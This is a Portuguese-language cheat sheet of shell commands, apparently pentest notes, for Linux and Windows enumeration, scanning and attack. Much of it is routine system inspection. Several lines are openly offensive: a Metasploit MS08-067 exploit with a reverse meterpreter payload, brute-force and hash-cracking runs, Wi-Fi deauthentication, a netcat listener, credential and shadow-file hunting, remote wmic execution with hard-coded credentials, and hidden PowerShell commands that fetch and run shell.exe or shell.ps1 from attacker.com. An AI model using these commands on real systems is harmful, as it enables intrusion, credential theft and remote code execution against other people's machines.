💻 Comandos CMD úteis
ipconfig /all # Mostra detalhes da rede local ping 8.8.8.8 # Verifica a conexão com o internet tracert google.com # Rastreia o caminho até um site netstat -an # Lista de conexões abertas whoami # Exibe o usuário logado systeminfo # Detalhes sobre o sistema operacional

# 🐧 Linux – Informações do sistema
uname -a && whoami && id && hostname && uptime

# 📁 Linux – Arquivos e permissões
find / -perm -4000 2>/dev/null && find / -type f -name "*.log" && ls -alh /etc/passwd /etc/shadow && cat /etc/sudoers && awk -F: '$3 == 0 { print $1 }' /etc/passwd

# 📡 Linux – Rede e conexões
ip a && netstat -tulnp && ss -tulwn && tcpdump -i eth0 && nmcli dev show

# 🕵️‍♂️ Linux – Enumeração e coleta de informações
who && last && ps aux --sort=-%mem && crontab -l && history && lsof -i && df -h && du -sh * && getent passwd && getent group

# 🧠 Linux – Script rápido de enumeração local
echo "== USERS ==" && cut -d: -f1 /etc/passwd && echo "== SUDOERS ==" && grep '^sudo:.*' /etc/group && echo "== CRON ==" && ls -l /etc/cron* && crontab -l

# 🪟 Windows – Informações básicas
systeminfo && whoami && hostname && net user && net accounts && net config workstation

# 🧠 Windows – Usuários e grupos
net localgroup administrators && Get-LocalUser | Format-List && Get-LocalGroupMember -Group Administrators

# ⚙️ Windows – Processos, serviços e tarefas
tasklist && netstat -ano && Get-Service && schtasks /query /fo LIST /v && Get-ScheduledTask

# 🔐 Windows – Senhas e políticas
secedit /export /cfg secpol.cfg && findstr /i "Password" secpol.cfg

# 🧠 Windows – Logs e eventos
wevtutil qe Security /f:text /c:10 && Get-EventLog -LogName Security -Newest 10

# 🌐 Nmap – Scanner de rede
nmap -sV -sC 192.168.1.1 && nmap -A 192.168.1.1 && nmap -p- 192.168.1.1 && nmap -O --osscan-guess 192.168.1.1 && nmap -T4 -A -v 192.168.0.0/24

# 🔍 Coleta de informações (rede, DNS, HTTP, etc.)
whois example.com && dig example.com && nslookup example.com && host example.com && traceroute google.com && curl -I http://example.com && wget http://site.com/arquivo.exe

# 🧪 Pentest – Metasploit
msfconsole -q -x "search smb; use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.0.10; set LHOST 192.168.0.100; set PAYLOAD windows/meterpreter/reverse_tcp; exploit"

# 🕷️ Nikto – Scanner de vulnerabilidades web
nikto -h http://192.168.0.10

# 💣 Força bruta – Hydra e John the Ripper
hydra -l admin -P wordlist.txt ftp://192.168.0.10 && john --wordlist=rockyou.txt hashes.txt

# 🔓 Quebra de hash simples
echo "hash_aqui" | hashcat -m 0 -a 0 -o cracked.txt rockyou.txt

# 📡 Wireless – Aircrack-ng
airmon-ng && airodump-ng wlan0mon && aireplay-ng -0 5 -a BSSID -c STATION wlan0mon && aircrack-ng capture.cap

# 🛡️ Linux – Antivírus CLI
clamscan -r /home/usuario && freshclam

# 🧰 Ferramentas úteis CLI
tcpdump -i eth0 && arp-scan -l && hping3 -S 192.168.0.1 -p 80 -c 3 && nc -nv 192.168.0.1 22 && nc -lvp 4444

# 🧠 Scripts rápidos Linux
( echo "UID 0:" && awk -F: '$3 == 0 { print $1 }' /etc/passwd ) && ( echo "Portas abertas:" && ss -tulwn ) && ( echo "Últimos logins:" && last -n 5 ) && ( echo "Conexões de rede:" && lsof -i -Pn )

# 🧠 Scripts rápidos PowerShell
Get-LocalUser | Where-Object { $_.Enabled -eq $true } && Get-EventLog -LogName Security -Newest 10 && Get-Process | Sort-Object CPU -Descending | Select-Object -First 5

# 🐚 Bash prompt para reconhecimento inicial
echo "=== SYSTEM ===" && uname -a && echo "=== USERS ===" && cat /etc/passwd | cut -d: -f1 && echo "=== NETWORK ===" && ip a && echo "=== PROCESSES ===" && ps aux --sort=-%mem | head

# 💬 Prompt útil para coleta em shell reversa
echo "[+] Conexão recebida!" && whoami && hostname && id && uname -a && ip a && ps aux && ls -la /home && netstat -tulnp && curl ifconfig.me

# 🛠️ Prompt para detecção rápida de anomalias Linux
find / -perm -4000 -type f 2>/dev/null && ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head && lastlog && chkconfig --list 2>/dev/null || systemctl list-unit-files

# 🔍 Prompt para enumeração web rápida com curl e grep
curl -s http://site.com | grep -iE "admin|login|password|user"

# 🔒 Prompt para encontrar arquivos com senhas
grep -ri "password" /etc 2>/dev/null && find / -name "*.env" 2>/dev/null && grep -ri "db_pass" /var/www 2>/dev/null


## 🪟 Sistema Windows

Comandos úteis para enumeração, análise e segurança em sistemas Windows (CMD e PowerShell):

```powershell
# 🪟 INFORMAÇÕES DO SISTEMA
systeminfo
hostname
whoami
echo %USERNAME%
echo %USERDOMAIN%

# 👤 USUÁRIOS E GRUPOS
net user
net localgroup
net localgroup administrators
Get-LocalUser | Format-List
Get-LocalGroupMember -Group Administrators

# 🔐 POLÍTICAS DE SENHA E SEGURANÇA
net accounts
secedit /export /cfg secpol.cfg
findstr /i "Password" secpol.cfg
Get-ADDefaultDomainPasswordPolicy

# ⚙️ SERVIÇOS, TAREFAS E PROCESSOS
tasklist
tasklist /v
taskkill /PID 1234 /F
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-Service | Where-Object {$_.Status -eq "Running"}
schtasks /query /fo LIST /v
Get-ScheduledTask

# 📡 REDE E CONEXÕES
ipconfig /all
netstat -ano
arp -a
route print
nslookup google.com
tracert google.com
Get-NetIPConfiguration
Get-NetTCPConnection | Sort-Object -Property State

# 📦 COMPARTILHAMENTOS E REDE LOCAL
net share
net view
net view \\192.168.0.1
nbtstat -A 192.168.0.1

# 🔍 ENUMERAÇÃO E RECONHECIMENTO
dir /s /b *.ps1 *.bat *.vbs *.txt *.log *.conf *.ini 2>nul
findstr /si "password" *.txt *.xml *.ini *.config *.ps1 *.bat
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"

# 🗃️ AUDITORIA E LOGS
wevtutil qe Security /f:text /c:10
wevtutil el
Get-EventLog -LogName Security -Newest 20
Get-WinEvent -LogName Security | Format-List -Property *

# 🧰 UTILITÁRIOS E TRUQUES DE SEGURANÇA
cipher /w:C\
takeown /f C:\Windows\System32\file.dll
icacls C:\Windows\System32\file.dll /grant %USERNAME%:F

# 🕵️ PERSISTÊNCIA, ENUMERAÇÃO AVANÇADA E LATERAL
net use Z: \\192.168.0.100\C$
wmic /node:192.168.0.10 /user:admin /password:123456 process call create "cmd.exe /c whoami"
powershell -c "Invoke-WebRequest http://attacker.com/shell.exe -OutFile C:\Users\Public\shell.exe"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# 📥 BAIXAR ARQUIVOS COM POWERSHELL
Invoke-WebRequest -Uri "http://site.com/file.exe" -OutFile "file.exe"
Start-BitsTransfer -Source "http://site.com/payload.exe" -Destination "C:\payload.exe"

# 💣 COMANDO SIMPLES PARA REVERSO/CONEXÃO
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
cmd.exe /c powershell -e <base64_payload>

# 🔒 ENCONTRAR SENHAS EM ARQUIVOS
findstr /si "password" *.config *.xml *.ini *.txt
findstr /si "connectionString" *.config

# 🧠 COMANDO ÚNICO DE ENUMERAÇÃO GERAL
echo [+] SYSTEM INFO && systeminfo && echo [+] USERS && net user && echo [+] ADMINS && net localgroup administrators && echo [+] PROCESSES && tasklist && echo [+] CONNECTIONS && netstat -ano

# 🧠 ENUMERAÇÃO AVANÇADA EM POWERSHELL
$env:USERNAME; Get-LocalUser; Get-LocalGroup; Get-LocalGroupMember "Administrators"; Get-NetIPAddress; Get-Service | ? Status -eq "Running"; Get-EventLog -LogName Security -Newest 5

